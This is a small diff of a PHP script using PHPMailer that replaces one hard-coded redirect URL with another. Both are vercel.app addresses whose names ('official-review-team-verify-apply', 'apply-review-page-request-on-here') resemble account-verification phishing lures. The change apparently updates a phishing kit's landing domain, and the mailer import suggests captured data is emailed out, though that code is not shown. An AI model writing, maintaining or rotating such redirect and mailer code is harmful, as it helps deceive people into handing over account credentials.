@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://official-review-team-verify-apply-h.vercel.app/");
+header("Location: https://apply-review-page-request-on-here.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
